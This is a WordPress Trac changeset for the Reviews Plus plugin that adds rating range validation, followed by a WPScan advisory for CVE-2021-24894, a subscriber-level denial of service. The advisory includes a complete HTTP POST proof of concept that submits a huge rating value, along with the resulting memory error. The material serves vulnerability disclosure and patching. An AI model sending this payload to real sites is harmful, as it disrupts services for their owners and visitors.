  | 51 |  | \_\_( 'You must be <a href="%s">logged in</a> to post a review.', 'reviews-plus' ), wp\_login\_url( apply\_filters( 'the\_permalink', get\_permalink( get\_the\_ID() ) ) ) |
  | 52 |  | ) . '</p>', |
  | 53 |  | 'label\_submit'~~=> $labels[ 'review\_submit\_label'~~ ], |
  | 54 |  | 'comment\_field'~~=> $redirect . '<input type="hidden" name="comment\_type" value="' . $comment\_type . '"><input type="hidden" name="review\_type" value="' . $comment\_type . '">' . ic\_review\_rating\_html() . '<p class="comment-form-title"><label for="title">' . $labels[ 'review\_title' ] . '</label> <input type="text" value="" name="ic\_review\_title" id="title"></p><p class="comment-form-comment"><label for="comment">' . $labels[ 'review\_text'~~ ] . ' <span class="required">\*</span></label> <textarea id="comment" name="comment" cols="45" rows="8" aria-required="true"></textarea></p>' |
  |  | 47 | 'comment\_notes\_after' => ' ', |
  |  | 48 | 'title\_reply'         => do\_shortcode( $labels['review\_reply\_title'] ), |
  |  | 49 | 'must\_log\_in'         => '<p class="must-log-in">' . sprintf( |
  |  | 50 | /\* translators: %s: login URL \*/ |
  |  | 51 | \_\_( 'You must be <a href="%s">logged in</a> to post a review.', 'reviews-plus' ), wp\_login\_url( apply\_filters( 'the\_permalink', get\_permalink( get\_the\_ID() ) ) ) |
  |  | 52 | ) . '</p>', |
  |  | 53 | 'label\_submit'        => $labels['review\_submit\_label'], |
  |  | 54 | 'comment\_field'       => $redirect . '<input type="hidden" name="comment\_type" value="' . $comment\_type . '"><input type="hidden" name="review\_type" value="' . $comment\_type . '">' . ic\_review\_rating\_html() . '<p class="comment-form-title"><label for="title">' . $labels['review\_title'] . '</label> <input type="text" value="" name="ic\_review\_title" id="title"></p><p class="comment-form-comment"><label for="comment">' . $labels['review\_text'] . ' <span class="required">\*</span></label> <textarea id="comment" name="comment" cols="45" rows="8" aria-required="true"></textarea></p>' |
  | 55 | 55 | ), $post\_id ); |
  | 56 | 56 | remove\_filter( 'comment\_form\_default\_fields', 'ic\_revs\_default\_fields' ); |
  | […](/browser/reviews-plus/trunk/includes/includes.php?rev=2419309#L59) | […](/browser/reviews-plus/trunk/includes/includes.php?rev=2618234#L59) |  |
  | 59 | 59 | function ic\_review\_rating\_html() { |
  | 60 | 60 | $reviews\_settings = get\_ic\_reviews\_sep\_settings(); |
  | 61 |  | if ( empty( $reviews\_settings[~~'disable\_rating'~~ ] ) ) { |
  |  | 61 | if ( empty( $reviews\_settings['disable\_rating'] ) ) { |
  | 62 | 62 | $labels = ic\_get\_reviews\_labels(); |
  | 63 |  | return '<p class="review-rating allow-edit"><label class="rating-label" for="ic\_review\_rating">' . $labels[ 'rating\_tite' ] . '</label><input type="hidden" name="ic\_review\_rating"><span class="rate-1" data-rating="1"></span><span class="rate-2" data-rating="2"></span><span class="rate-3" data-rating="3"></span><span class="rate-4" data-rating="4"></span><span class="rate-5" data-rating="5"></span></p>'; |
  | 64 |  | } |
  | 65 |  | } |
  | 66 |  |  |
  | 67 |  | add\_filter( 'get\_the\_excerpt', 'ic\_check\_get\_excerpt', -1 ); |
  |  | 63 |  |
  |  | 64 | return '<p class="review-rating allow-edit"><label class="rating-label" for="ic\_review\_rating">' . $labels['rating\_tite'] . '</label><input type="hidden" name="ic\_review\_rating"><span class="rate-1" data-rating="1"></span><span class="rate-2" data-rating="2"></span><span class="rate-3" data-rating="3"></span><span class="rate-4" data-rating="4"></span><span class="rate-5" data-rating="5"></span></p>'; |
  |  | 65 | } |
  |  | 66 | } |
  |  | 67 |  |
  |  | 68 | add\_filter( 'get\_the\_excerpt', 'ic\_check\_get\_excerpt', - 1 ); |
  | 68 | 69 |  |
  | 69 | 70 | /\*\* |
  | 70 | 71 | \* Checks if excerpt is being called instead of content |
  | 71 | 72 | \* |
  |  | 73 | \* @param type $excertp |
  |  | 74 | \* |
  |  | 75 | \* @return type |
  | 72 | 76 | \* @global boolean $ic\_is\_excerpt |
  | 73 |  | ~~\* @param type $excertp~~ |
  | 74 |  | ~~\* @return type~~ |
  | 75 | 77 | \*/ |
  | 76 | 78 | function ic\_check\_get\_excerpt( $excertp ) { |
  | 77 | 79 | global $ic\_is\_excerpt; |
  | 78 | 80 | $ic\_is\_excerpt = true; |
  |  | 81 |  |
  | 79 | 82 | return $excertp; |
  | 80 | 83 | } |
  | […](/browser/reviews-plus/trunk/includes/includes.php?rev=2419309#L85) | […](/browser/reviews-plus/trunk/includes/includes.php?rev=2618234#L88) |  |
  | 85 | 88 | \* Checks if excerpt is being called instead of content |
  | 86 | 89 | \* |
  |  | 90 | \* @param type $excertp |
  |  | 91 | \* |
  |  | 92 | \* @return type |
  | 87 | 93 | \* @global boolean $ic\_is\_excerpt |
  | 88 |  | ~~\* @param type $excertp~~ |
  | 89 |  | ~~\* @return type~~ |
  | 90 | 94 | \*/ |
  | 91 | 95 | function ic\_uncheck\_get\_excerpt( $excertp ) { |
  | 92 | 96 | global $ic\_is\_excerpt; |
  | 93 | 97 | $ic\_is\_excerpt = false; |
  |  | 98 |  |
  | 94 | 99 | return $excertp; |
  | 95 | 100 | } |
  | […](/browser/reviews-plus/trunk/includes/includes.php?rev=2419309#L101) | […](/browser/reviews-plus/trunk/includes/includes.php?rev=2618234#L106) |  |
  | 101 | 106 | \* |
  | 102 | 107 | \* @param type $path |
  |  | 108 | \* |
  | 103 | 109 | \* @return type |
  | 104 | 110 | \*/ |
  | 105 | 111 | function ic\_replace\_default\_comments\_form( $path ) { |
  | 106 |  | if ( is\_ic\_post\_type\_review\_enabled() || (~~function\_exists( 'is\_ic\_product\_page' ) && is\_ic\_product\_page()~~) ) { |
  |  | 112 | if ( is\_ic\_post\_type\_review\_enabled() || ( function\_exists( 'is\_ic\_product\_page' ) && is\_ic\_product\_page() ) ) { |
  | 107 | 113 | return AL\_REVIEWS\_BASE\_PATH . '/includes/review-form.php'; |
  | 108 | 114 | } |
  |  | 115 |  |
  | 109 | 116 | return $path; |
  | 110 | 117 | } |
  | […](/browser/reviews-plus/trunk/includes/includes.php?rev=2419309#L120) | […](/browser/reviews-plus/trunk/includes/includes.php?rev=2618234#L127) |  |
  | 120 | 127 | function ic\_reviews\_list( $post\_ids = null, $post\_type = null, $tax\_ids = null, $taxonomy = null ) { |
  | 121 | 128 | $comments = null; |
  | 122 |  | if ( !~~empty( $post\_ids ) || !empty( $post\_type ) || !~~empty( $tax\_ids ) ) { |
  | 123 |  | if ( !empty( $tax\_ids ) ) { |
  |  | 129 | if ( ! empty( $post\_ids ) || ! empty( $post\_type ) || ! empty( $tax\_ids ) ) { |
  |  | 130 | if ( ! empty( $tax\_ids ) ) { |
  | 124 | 131 | if ( empty( $taxonomy ) ) { |
  | 125 |  | $post\_types = get\_ic\_review\_active\_post\_types(); |
  | 126 |  | $post\_types[] = 'al\_product'; |
  |  | 132 | $post\_types   = get\_ic\_review\_active\_post\_types(); |
  |  | 133 | $post\_types[] = 'al\_product'; |
  | 127 | 134 | foreach ( $post\_types as $type ) { |
  | 128 | 135 | $taxonomies = get\_object\_taxonomies( $type ); |
  | 129 |  | if ( !empty( $taxonomies ) ) { |
  |  | 136 | if ( ! empty( $taxonomies ) ) { |
  | 130 | 137 | $taxonomy = reset( $taxonomies ); |
  | 131 | 138 | break; |
  | […](/browser/reviews-plus/trunk/includes/includes.php?rev=2419309#L133) | […](/browser/reviews-plus/trunk/includes/includes.php?rev=2618234#L140) |  |
  | 133 | 140 | } |
  | 134 | 141 | } |
  | 135 |  | $args = array( |
  | 136 |  | 'post\_type' => $post\_type, |
  | 137 |  | 'tax\_query' => array( |
  |  | 142 | $args     = array( |
  |  | 143 | 'post\_type'      => $post\_type, |
  |  | 144 | 'tax\_query'      => array( |
  | 138 | 145 | array( |
  | 139 |  | 'taxonomy' => $taxonomy, |
  | 140 |  | 'terms' => $tax\_ids, |
  | 141 |  | 'field' => 'term\_id', |
  |  | 146 | 'taxonomy' => $taxonomy, |
  |  | 147 | 'terms'    => $tax\_ids, |
  |  | 148 | 'field'    => 'term\_id', |
  | 142 | 149 | ), |
  | 143 | 150 | ), |
  | 144 |  | 'fields' => 'ids', |
  | 145 |  | 'post\_status' => 'publish', |
  |  | 151 | 'fields'         => 'ids', |
  |  | 152 | 'post\_status'    => 'publish', |
  | 146 | 153 | 'posts\_per\_page' => 1000 |
  | 147 | 154 | ); |
  | 148 |  | $post\_ids = get\_posts( $args ); |
  | 149 |  | } |
  | 150 |  | $args = array( |
  | 151 |  | 'post\_\_in' => $post\_ids, |
  | 152 |  | 'post\_type' => $post\_type, |
  | 153 |  | 'status' => 'approve' |
  |  | 155 | $post\_ids = get\_posts( $args ); |
  |  | 156 | } |
  |  | 157 | $args     = array( |
  |  | 158 | 'post\_\_in'  => $post\_ids, |
  |  | 159 | 'post\_type' => $post\_type, |
  |  | 160 | 'status'    => 'approve' |
  | 154 | 161 | ); |
  | 155 |  | $comments = get\_comments( $args ); |
  |  | 162 | $comments = get\_comments( $args ); |
  | 156 | 163 | } |
  | 157 | 164 | if ( ic\_show\_old\_comments() ) { |
  | […](/browser/reviews-plus/trunk/includes/includes.php?rev=2419309#L161) | […](/browser/reviews-plus/trunk/includes/includes.php?rev=2618234#L168) |  |
  | 161 | 168 | } |
  | 162 | 169 | ?> |
  | 163 |  | ~~<div class =~~ "review-list"> |
  |  | 170 | <div class="review-list"> |
  | 164 | 171 | <?php |
  | 165 | 172 | wp\_list\_comments( array( |
  | 166 |  | 'style' => 'div', |
  |  | 173 | 'style'      => 'div', |
  | 167 | 174 | 'short\_ping' => true, |
  | 168 |  | 'type' => $display\_comment\_type, |
  |  | 175 | 'type'       => $display\_comment\_type, |
  | 169 | 176 | 'reply\_text' => \_\_( 'Reply', 'reviews-plus' ), |
  | 170 |  | 'callback' => 'implecode\_reviews', |
  |  | 177 | 'callback'   => 'implecode\_reviews', |
  | 171 | 178 | ), $comments ); |
  | 172 | 179 | ?> |
  | 173 |  | </div><!-- .comment-list --> |
  |  | 180 | </div><!-- .comment-list --> |
  | 174 | 181 | <?php |
  | 175 | 182 | } |
  | […](/browser/reviews-plus/trunk/includes/includes.php?rev=2419309#L178) | […](/browser/reviews-plus/trunk/includes/includes.php?rev=2618234#L185) |  |
  | 178 | 185 | if ( get\_comment\_pages\_count() > 1 && get\_option( 'page\_comments' ) ) { |
  | 179 | 186 | ?> |
  | 180 |  | <nav id="review-nav-<?php echo $where ?>" class="review-navigation" role="navigation"> |
  | 181 |  | <h1 class="screen-reader-text"><?php \_e( 'Reviews navigation', 'reviews-plus' ); ?></h1> |
  | 182 |  | <div class="nav-previous"><?php previous\_comments\_link( \_\_( '&larr; Older Reviews', 'reviews-plus' ) ); ?></div> |
  | 183 |  | <div class="nav-next"><?php next\_comments\_link( \_\_( 'Newer Reviews &rarr;', 'reviews-plus' ) ); ?></div> |
  | 184 |  | </nav><!-- #review-nav-above --> |
  |  | 187 | <nav id="review-nav-<?php echo $where ?>" class="review-navigation" role="navigation"> |
  |  | 188 | <h1 class="screen-reader-text"><?php \_e( 'Reviews navigation', 'reviews-plus' ); ?></h1> |
  |  | 189 | <div class="nav-previous"><?php previous\_comments\_link( \_\_( '&larr; Older Reviews', 'reviews-plus' ) ); ?></div> |
  |  | 190 | <div class="nav-next"><?php next\_comments\_link( \_\_( 'Newer Reviews &rarr;', 'reviews-plus' ) ); ?></div> |
  |  | 191 | </nav><!-- #review-nav-above --> |
  | 185 | 192 | <?php |
  | 186 | 193 | } |
  | […](/browser/reviews-plus/trunk/includes/includes.php?rev=2419309#L188) | […](/browser/reviews-plus/trunk/includes/includes.php?rev=2618234#L195) |  |
  | 188 | 195 |  |
  | 189 | 196 | function implecode\_reviews( $comment, $args, $depth ) { |
  | 190 |  | $GLOBALS[~~'comment'~~ ] = $comment; |
  |  | 197 | $GLOBALS['comment'] = $comment; |
  | 191 | 198 | ?> |
  | 192 |  | <div <?php comment\_class( 'ic\_rev' ); ?> id="review-<?php comment\_ID() ?>"> |
  | 193 |  | <div class="review-left"> |
  | 194 |  | <div class="reviewer-name"> |
  | 195 |  | <span><?php echo get\_comment\_author\_link() ?></span> |
  | 196 |  | </div> |
  | 197 |  | <div class="review-avatar"> |
  | 198 |  | <?php |
  | 199 |  | echo get\_avatar( $comment->comment\_author\_email, '68', '', get\_the\_author\_meta( 'display\_name' ) ); |
  | 200 |  | ?> |
  | 201 |  | </div> |
  | 202 |  | </div> |
  | 203 |  | <div class="review-right"> |
  | 204 |  | <div class="review-rating"> |
  | 205 |  | <?php echo ic\_ic\_rev\_rating( $comment->comment\_ID ) ?> |
  | 206 |  | </div> |
  | 207 |  | <div class="review-title"> |
  | 208 |  | <?php echo ic\_get\_ic\_rev\_title( $comment->comment\_ID ) ?> |
  | 209 |  | </div> |
  | 210 |  | <?php if ( $comment->comment\_approved == '0' ) { ?> |
  | 211 |  | <?php implecode\_info( \_\_( 'Your review is awaiting moderation.', 'reviews-plus' ) ) ?> |
  | 212 |  | <?php } ?> |
  | 213 |  |  |
  | 214 |  | <div class="review-text"> |
  | 215 |  | <?php comment\_text(); ?> |
  | 216 |  | </div> |
  | 217 |  | <div class="review-time"> |
  | 218 |  | <?php echo ic\_time\_ago(); ?> |
  | 219 |  | </div> |
  |  | 199 | <div <?php comment\_class( 'ic\_rev' ); ?> id="review-<?php comment\_ID() ?>"> |
  |  | 200 | <div class="review-left"> |
  |  | 201 | <div class="reviewer-name"> |
  |  | 202 | <span><?php echo get\_comment\_author\_link() ?></span> |
  |  | 203 | </div> |
  |  | 204 | <div class="review-avatar"> |
  | 220 | 205 | <?php |
  | 221 |  | $reviews\_settings = get\_ic\_reviews\_sep\_settings(); |
  | 222 |  | if ( current\_user\_can( 'administrator' ) || !empty( $reviews\_settings[ 'reply\_enabled' ] ) ) { |
  | 223 |  | ?> |
  | 224 |  | <div class="reply"> |
  | 225 |  | <?php comment\_reply\_link( array\_merge( $args, array( 'depth' => $depth, 'max\_depth' => $args[ 'max\_depth' ], 'add\_below' => 'review' ) ) ) ?> |
  | 226 |  | </div> |
  | 227 |  | <?php |
  | 228 |  | } |
  |  | 206 | echo get\_avatar( $comment->comment\_author\_email, '68', '', get\_the\_author\_meta( 'display\_name' ) ); |
  | 229 | 207 | ?> |
  | 230 |  | </div> |
  |  | 208 | </div> |
  |  | 209 | </div> |
  |  | 210 | <div class="review-right"> |
  |  | 211 | <div class="review-rating"> |
  |  | 212 | <?php echo ic\_ic\_rev\_rating( $comment->comment\_ID ) ?> |
  |  | 213 | </div> |
  |  | 214 | <div class="review-title"> |
  |  | 215 | <?php echo ic\_get\_ic\_rev\_title( $comment->comment\_ID ) ?> |
  |  | 216 | </div> |
  |  | 217 | <?php if ( $comment->comment\_approved == '0' ) { ?> |
  |  | 218 | <?php implecode\_info( \_\_( 'Your review is awaiting moderation.', 'reviews-plus' ) ) ?> |
  |  | 219 | <?php } ?> |
  |  | 220 |  |
  |  | 221 | <div class="review-text"> |
  |  | 222 | <?php comment\_text(); ?> |
  |  | 223 | </div> |
  |  | 224 | <div class="review-time"> |
  |  | 225 | <?php echo ic\_time\_ago(); ?> |
  |  | 226 | </div> |
  | 231 | 227 | <?php |
  | 232 |  | } |
  | 233 |  |  |
  | 234 |  | add\_filter( 'preprocess\_comment', 'ic\_save\_ic\_rev\_type', -1 ); |
  | 235 |  |  |
  | 236 |  | /\*\* |
  | 237 |  | \* Saves product review comment type when submiting on front-end |
  | 238 |  | \* |
  | 239 |  | \* @param string $args |
  | 240 |  | \* @return string |
  | 241 |  | \*/ |
  | 242 |  | function ic\_save\_ic\_rev\_type( $args ) { |
  | 243 |  | if ( isset( $\_POST[ 'review\_type' ] ) && ic\_string\_contains( $\_POST[ 'review\_type' ], 'ic\_rev' ) ) { |
  | 244 |  | $args[ 'comment\_type' ] = sanitize\_text\_field( $\_POST[ 'review\_type' ] ); |
  | 245 |  | } |
  | 246 |  | return $args; |
  | 247 |  | } |
  | 248 |  |  |
  | 249 |  | add\_action( 'comment\_post', 'ic\_save\_ic\_rev\_rating' ); |
  | 250 |  |  |
  | 251 |  | /\*\* |
  | 252 |  | \* Saves review rating value |
  | 253 |  | \* |
  | 254 |  | \* @param type $comment\_ID |
  | 255 |  | \*/ |
  | 256 |  | function ic\_save\_ic\_rev\_rating( $comment\_ID ) { |
  | 257 |  | if ( isset( $\_POST[ 'ic\_review\_rating' ] ) ) { |
  | 258 |  | $rating = intval( $\_POST[ 'ic\_review\_rating' ] ); |
  | 259 |  | if ( !empty( $rating ) ) { |
  | 260 |  | update\_comment\_meta( $comment\_ID, 'ic\_review\_rating', $rating ); |
  | 261 |  | } |
  | 262 |  | } |
  | 263 |  | if ( isset( $\_POST[ 'ic\_review\_title' ] ) ) { |
  | 264 |  | $title = esc\_attr( sanitize\_text\_field( $\_POST[ 'ic\_review\_title' ] ) ); |
  | 265 |  | if ( !empty( $title ) ) { |
  | 266 |  | update\_comment\_meta( $comment\_ID, 'ic\_review\_title', $title ); |
  | 267 |  | } |
  | 268 |  | } |
  | 269 |  | } |
  | 270 |  |  |
  | 271 |  | function ic\_revs\_default\_fields( $fields ) { |
  | 272 |  | $commenter           = wp\_get\_current\_commenter(); |
  | 273 |  | $req                 = get\_option( 'require\_name\_email' ); |
  | 274 |  | $aria\_req            = ( $req ? " aria-required='true'" : '' ); |
  | 275 |  | $fields[ 'email' ]   = '<p class="comment-form-email"><label for="email">' . \_\_( 'Email', 'reviews-plus' ) . ' ' . |
  | 276 |  | ( $req ? '<span class="required">\*</span>' : '' ) . '</label> <input id="email" name="email" type="text" value="' . esc\_attr( $commenter[ 'comment\_author\_email' ] ) . |
  | 277 |  | '" size="30"' . $aria\_req . ' /></p>'; |
  | 278 |  | $fields[ 'author' ]  = '<p class="comment-form-author"><label for="author">' . \_\_( 'Name', 'reviews-plus' ) . ' ' . |
  | 279 |  | ( $req ? '<span class="required">\*</span>' : '' ) . '</label> <input id="author" name="author" type="text" value="' . esc\_attr( $commenter[ 'comment\_author' ] ) . |
  | 280 |  | '" size="30"' . $aria\_req . ' /></p>'; |
  | 281 |  | unset( $fields[ 'url' ] ); |
  | 282 |  | return $fields; |
  | 283 |  | } |
  |  | 228 | $reviews\_settings = get\_ic\_reviews\_sep\_settings(); |
  |  | 229 | if ( current\_user\_can( 'administrator' ) || ! empty( $reviews\_settings['reply\_enabled'] ) ) { |
  |  | 230 | ?> |
  |  | 231 | <div class="reply"> |
  |  | 232 | <?php comment\_reply\_link( array\_merge( $args, array( 'depth'     => $depth, |
  |  | 233 | 'max\_depth' => $args['max\_depth'], |
  |  | 234 | 'add\_below' => 'review' |
  |  | 235 | ) ) ) ?> |
  |  | 236 | </div> |
  |  | 237 | <?php |
  |  | 238 | } |
  |  | 239 | ?> |
  |  | 240 | </div> |
  |  | 241 | <?php |
  |  | 242 | } |
  |  | 243 |  |
  |  | 244 | add\_filter( 'preprocess\_comment', 'ic\_save\_ic\_rev\_type', - 1 ); |
  |  | 245 |  |
  |  | 246 | /\*\* |
  |  | 247 | \* Saves product review comment type when submiting on front-end |
  |  | 248 | \* |
  |  | 249 | \* @param string $args |
  |  | 250 | \* |
  |  | 251 | \* @return string |
  |  | 252 | \*/ |
  |  | 253 | function ic\_save\_ic\_rev\_type( $args ) { |
  |  | 254 | if ( isset( $\_POST['review\_type'] ) && ic\_string\_contains( $\_POST['review\_type'], 'ic\_rev' ) ) { |
  |  | 255 | $args['comment\_type'] = sanitize\_text\_field( $\_POST['review\_type'] ); |
  |  | 256 | } |
  |  | 257 |  |
  |  | 258 | return $args; |
  |  | 259 | } |
  |  | 260 |  |
  |  | 261 | add\_action( 'comment\_post', 'ic\_save\_ic\_rev\_rating' ); |
  |  | 262 |  |
  |  | 263 | /\*\* |
  |  | 264 | \* Saves review rating value |
  |  | 265 | \* |
  |  | 266 | \* @param type $comment\_ID |
  |  | 267 | \*/ |
  |  | 268 | function ic\_save\_ic\_rev\_rating( $comment\_ID ) { |
  |  | 269 | if ( isset( $\_POST['ic\_review\_rating'] ) ) { |
  |  | 270 | $rating = ic\_sanitize\_rating( $\_POST['ic\_review\_rating'] ); |
  |  | 271 | if ( ! empty( $rating ) ) { |
  |  | 272 | update\_comment\_meta( $comment\_ID, 'ic\_review\_rating', $rating ); |
  |  | 273 | } |
  |  | 274 | } |
  |  | 275 | if ( isset( $\_POST['ic\_review\_title'] ) ) { |
  |  | 276 | $title = esc\_attr( sanitize\_text\_field( $\_POST['ic\_review\_title'] ) ); |
  |  | 277 | if ( ! empty( $title ) ) { |
  |  | 278 | update\_comment\_meta( $comment\_ID, 'ic\_review\_title', $title ); |
  |  | 279 | } |
  |  | 280 | } |
  |  | 281 | } |
  |  | 282 |  |
  |  | 283 | function ic\_revs\_default\_fields( $fields ) { |
  |  | 284 | $commenter        = wp\_get\_current\_commenter(); |
  |  | 285 | $req              = get\_option( 'require\_name\_email' ); |
  |  | 286 | $aria\_req         = ( $req ? " aria-required='true'" : '' ); |
  |  | 287 | $fields['email']  = '<p class="comment-form-email"><label for="email">' . \_\_( 'Email', 'reviews-plus' ) . ' ' . |
  |  | 288 | ( $req ? '<span class="required">\*</span>' : '' ) . '</label> <input id="email" name="email" type="text" value="' . esc\_attr( $commenter['comment\_author\_email'] ) . |
  |  | 289 | '" size="30"' . $aria\_req . ' /></p>'; |
  |  | 290 | $fields['author'] = '<p class="comment-form-author"><label for="author">' . \_\_( 'Name', 'reviews-plus' ) . ' ' . |
  |  | 291 | ( $req ? '<span class="required">\*</span>' : '' ) . '</label> <input id="author" name="author" type="text" value="' . esc\_attr( $commenter['comment\_author'] ) . |
  |  | 292 | '" size="30"' . $aria\_req . ' /></p>'; |
  |  | 293 | unset( $fields['url'] ); |
  |  | 294 |  |
  |  | 295 | return $fields; |
  |  | 296 | } |
* ## [reviews-plus/trunk/readme.txt](/changeset/2618234/reviews-plus/trunk/readme.txt "Show the changeset 2618234 restricted to reviews-plus/trunk/readme.txt")

  | [r2606660](/browser/reviews-plus/trunk/readme.txt?rev=2606660#L4 "Show revision 2606660 of this file in browser") | [r2618234](/browser/reviews-plus/trunk/readme.txt?rev=2618234#L4 "Show revision 2618234 of this file in browser") |  |
  | --- | --- | --- |
  | 4 | 4 | Requires at least: 3.5 |
  | 5 | 5 | Tested up to: 5.8 |
  | 6 |  | Stable tag: 1.2.1~~3~~ |
  |  | 6 | Stable tag: 1.2.14 |
  | 7 | 7 | License: GPLv3 |
  | 8 | 8 | License URI: http://www.gnu.org/licenses/gpl-3.0.html |
  | […](/browser/reviews-plus/trunk/readme.txt?rev=2606660#L84) | […](/browser/reviews-plus/trunk/readme.txt?rev=2618234#L84) |  |
  | 84 | 84 |  |
  | 85 | 85 | == Changelog == |
  |  | 86 |  |
  |  | 87 | = 1.2.14 = |
  |  | 88 |  |
  |  | 89 | \* Make sure that the provided rating is within the correct range |
  | 86 | 90 |  |
  | 87 | 91 | = 1.2.13 = |
* ## [reviews-plus/trunk/reviews-plus.php](/changeset/2618234/reviews-plus/trunk/reviews-plus.php "Show the changeset 2618234 restricted to reviews-plus/trunk/reviews-plus.php")

  | [r2606660](/browser/reviews-plus/trunk/reviews-plus.php?rev=2606660#L4 "Show revision 2606660 of this file in browser") | [r2618234](/browser/reviews-plus/trunk/reviews-plus.php?rev=2618234#L4 "Show revision 2618234 of this file in browser") |  |
  | --- | --- | --- |
  | 4 | 4 | \* Plugin Name: Reviews Plus - Google compatible WordPress Reviews for any content |
  | 5 | 5 | \* Description: Add rich reviews to posts, pages or any custom post type. Reviews summary compatible with SERP. |
  | 6 |  | \* Version: 1.2.1~~3~~ |
  |  | 6 | \* Version: 1.2.14 |
  | 7 | 7 | \* Author: impleCode |
  | 8 | 8 | \* Author URI: https://implecode.com |

**Note:** See [TracChangeset](/wiki/TracChangeset)
for help on using the changeset viewer.

[Trac UI Preferences](/prefs)
### Download in other formats:

* [Unified Diff](?format=diff&new=2618234)
* [Zip Archive](?format=zip&new=2618234)

* [About](https://wordpress.org/about/)
* [News](https://wordpress.org/news/)
* [Hosting](https://wordpress.org/hosting/)
* [Donate](https://wordpressfoundation.org/donate/)
* [Swag](https://mercantile.wordpress.org/)

* [Documentation](https://wordpress.org/documentation/)
* [Developers](https://developer.wordpress.org/)
* [Get Involved](https://make.wordpress.org/)
* [Learn](https://learn.wordpress.org/)

* [Showcase](https://wordpress.org/showcase/)
* [Plugins](https://wordpress.org/plugins/)
* [Themes](https://wordpress.org/themes/)
* [Patterns](https://wordpress.org/patterns/)

* [WordCamp](https://central.wordcamp.org/)
* [WordPress.TV](https://wordpress.tv/)
* [BuddyPress](https://buddypress.org/)
* [bbPress](https://bbpress.org/)

* [WordPress.com](https://wordpress.com/?ref=wporg-footer)
* [Matt](https://ma.tt/)
* [Privacy](https://wordpress.org/about/privacy/)
* [Public Code](https://publiccode.eu/)

[WordPress.org](https://wordpress.org/)

[WordPress.org](https://wordpress.org/)

* [Visit our Facebook page](https://www.facebook.com/WordPress/)
* [Visit our Twitter account](https://twitter.com/WordPress)
* [Visit our Instagram account](https://www.instagram.com/wordpress/)
* [Visit our LinkedIn account](https://www.linkedin.com/company/wordpress)

![Code is Poetry](https://s.w.org/style/images/code-is-poetry-for-dark-bg.svg)



=== Content from wpscan.com_3f2335d6_20250114_230643.html ===


[Skip to content](#wp--skip-link--target)

* [Features](https://a8cteam5105.wordpress.com/features/)
* [Pricing](https://a8cteam5105.wordpress.com/pricing/)
* Solutions
  + [Status](https://status.wpscan.com/)
  + [API Details](/api)
  + [CLI Scanner](https://a8cteam5105.wordpress.com/wordpress-cli-scanner/)
* Vulnerabilities
  + [Themes](/themes)
  + [WordPress](/wordpresses)
  + [Plugins](/plugins)
  + [Stats](/statistics)
  + [Submit Vulnerabilities](/submit)
  + [Leaderboard](/leaderboard)
* Resources
  + [Blog](/blog)
  + [Enterprise Features](https://a8cteam5105.wordpress.com/enterprise-customers-features/)
  + [How to Install WPScan](https://a8cteam5105.wordpress.com/how-to-install-wpscan/)
  + [WPScan Glossary](/wpscan-glossary)
  + [2024 Website Threat Report](https://wpscan.com/2023-website-threat-report/)

Search

## WordPress Plugin Vulnerabilities

# Reviews Plus < 1.2.14 - Subscriber+ Reviews DoS

### Description

The plugin does not validate the submitted rating, allowing submission of long integer, causing a Denial of Service in the review section when an authenticated user submit such rating and the reviews are set to be displayed on the post/page

### Proof of Concept

Enable reviews for post/pages, and enable the "Show Reviews on" setting for All posts or pages as well.
Then log in as a user such as subscriber and submit a review with a long rating, e.g
POST /wp-comments-post.php HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,\*/\*;q=0.8
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 181
Connection: close
Cookie: [subscriber+]
Upgrade-Insecure-Requests: 1
comment\_type=ic\_rev\_post&review\_type=ic\_rev\_post&ic\_review\_rating=100000000000000000000000&ic\_review\_title=aa&comment=cerh&submit=Submit+Review&comment\_post\_ID=2123&comment\_parent=0
The review section of the post/page will crash with an error like "Allowed memory size of 268435456 bytes exhausted (tried to allocate 249561152 bytes) in /var/www/wp-content/plugins/reviews-plus/functions/functions.php on line 76" when viewed

### Affects Plugins

[![Plugin icon](https://s2.wp.com/wp-content/themes/a8c/wpscan/assets/img/plugin-icon.svg)

reviews-plus](https://a8cteam5105.wordpress.com/plugin/reviews-plus/)

![](https://s2.wp.com/wp-content/themes/a8c/wpscan/assets/img/checkmark-green-alt.svg)
Fixed in 1.2.14

### References

CVE
[CVE-2021-24894](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-24894)

URL
<https://plugins.trac.wordpress.org/changeset/2618234>

### Miscellaneous

Original Researcher
Drew Jones

Submitter
Drew Jones

Submitter twitter
[qhum7sec](//twitter.com/qhum7sec)

Verified
Yes

WPVDB ID
[79bb5acb-ea56-41a9-83a1-28a181ae41e2](https://a8cteam5105.wordpress.com/vulnerability/79bb5acb-ea56-41a9-83a1-28a181ae41e2/)

### Timeline

Publicly Published
2021-10-25 (about 3 years ago)

Added
2021-10-25 (about 3 years ago)

Last Updated
2022-04-10 (about 2 years ago)

### Other

Published
Title

Published
2024-02-08
Title
[Backuply - Backup, Restore, Migrate and Clone < 1.2.6 - Unauthenticated Denial of Service](https://a8cteam5105.wordpress.com/vulnerability/90113124-233b-4666-9ef5-a341f78903cd/)

Published
2014-11-20
Title
[WordPress <= 4.0 - Long Password Denial of Service (DoS)](https://a8cteam5105.wordpress.com/vulnerability/aa6a0791-5d59-4c80-b943-bfec7fff7862/)

Published
2019-12-23
Title
[BuddyPress < 5.1.1 - Denial of Service](https://a8cteam5105.wordpress.com/vulnerability/4ba45acd-4035-403b-8045-523e3e2b97b9/)

Published
2015-07-02
Title
[Simple Ads Manager < 2.9.4.116 - Unauthenticated Denial of Service (DoS)](https://a8cteam5105.wordpress.com/vulnerability/64721442-6d95-4f28-a942-5a26a7210dfc/)

Published
2021-12-06
Title
[Stars Rating < 3.5.1 - Comments Denial of Service](https://a8cteam5105.wordpress.com/vulnerability/05d3af69-20b4-499a-8322-2b53674d6a58/)

![](https://wpscan.com/wp-content/uploads/2023/10/wpscan-logo-dark.png?w=246)

### Vulnerabilities

* [WordPress](/wordpresses)
* [Plugins](/plugins)
* [Themes](/themes)
* [Our Stats](https://a8cteam5105.wordpress.com/statistics/)
* [Submit vulnerabilities](https://a8cteam5105.wordpress.com/submit/)

#### About

* [How it works](/features)
* [Pricing](/pricing)
* [WordPress plugin](https://wordpress.org/plugins/wpscan/)
* [Blog](/blog)
* [Contact](/contact)

#### For Developers

* [Status](https://status.wpscan.com/)
* [API details](/api)
* [CLI scanner](/wordpress-cli-scanner)

#### Other

* [Privacy](https://automattic.com/privacy/)
